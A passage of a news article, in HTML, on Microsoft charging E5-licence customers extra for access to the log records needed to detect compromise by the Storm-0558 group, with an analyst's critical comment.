<p>Microsoft, however, requires customers to <a href="https://learn.microsoft.com/en-US/microsoft-365/admin/manage/assign-licenses-to-users?view=o365-worldwide">pay an additional fee</a> to access these records. The cost for an “E5” enterprise license allowing such access is $57 per month per user, compared to an E3 license cost of $36 per month per customer.</p>
<p>“The fact that Microsoft only allows those who pay the extra money for E5 licensing to see the relevant log files is, well, something…” Will Dorman, senior principal analyst at Analygence, said in an interview. “If you're not an E5-paying customer, you lose the ability to see that you were compromised.”</p>
<p>While Microsoft’s disclosures have been less than forthcoming in the role its vulnerabilities played in breaching the accounts of organizations, Friday’s disclosure provides helpful indicators that people can use to determine if they’ve been targeted or compromised by Storm-0558.</p>
